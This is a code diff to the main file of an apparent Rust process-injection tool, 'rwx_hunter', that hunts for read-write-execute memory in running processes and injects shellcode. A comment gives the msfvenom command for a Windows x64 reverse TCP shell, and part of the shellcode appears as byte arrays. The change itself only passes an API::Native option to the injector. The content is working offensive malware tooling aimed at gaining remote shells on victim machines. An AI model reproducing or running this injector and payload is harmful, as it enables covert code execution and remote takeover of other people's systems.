@@ -1,6 +1,6 @@
 use std::error::Error;
 
-use rwx_hunter::RWXhunter;
+use rwx_hunter::{RWXhunter, API};
 
 fn main() -> Result<(), Box<dyn Error>> {
     // msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f num LHOST=<IP> LPORT=<PORT>
@@ -64,7 +64,12 @@ fn main() -> Result<(), Box<dyn Error>> {
         0x4b, 0x10, 0x88, 0x67, 0x69, 0x0c, 0x50, 0x05, 0xdd,
     ];
 
-    let mut hunter = RWXhunter::new(shellcode_x64, shellcode_x86, vec![12, 3, 250, 8, 3].into());
+    let mut hunter = RWXhunter::new(
+        shellcode_x64,
+        shellcode_x86,
+        vec![12, 3, 250, 8, 3].into(),
+        API::Native,
+    );
     while hunter.find_next_candidate().is_ok() {
         if hunter.inject().is_ok() {
             return Ok(());
